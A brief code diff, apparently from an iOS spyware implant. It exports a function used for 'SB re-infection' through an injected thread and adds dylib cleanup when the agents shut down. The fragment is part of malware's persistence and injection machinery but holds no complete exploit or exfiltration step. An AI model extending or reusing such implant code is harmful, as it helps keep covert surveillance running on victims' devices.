@@ -148,7 +148,7 @@ void init(void)
 /*
  * runned by injected thread for SB re-infection
  */
-void checkInit(char *dylibName)
+__attribute__((visibility("default"))) void checkInit(char *dylibName)
 {
   if (dylibName != NULL)
     snprintf(gDylibPath, sizeof(gDylibPath), "%s", dylibName);
@@ -621,6 +621,10 @@ void catch_me()
   
   [self stopAllAgents];
   [self stopAllEvents];
+  
+  sleep(1);
+  
+  [sharedMem removeDylibRLSource];
   
   gInitAlreadyRunned = FALSE;
   
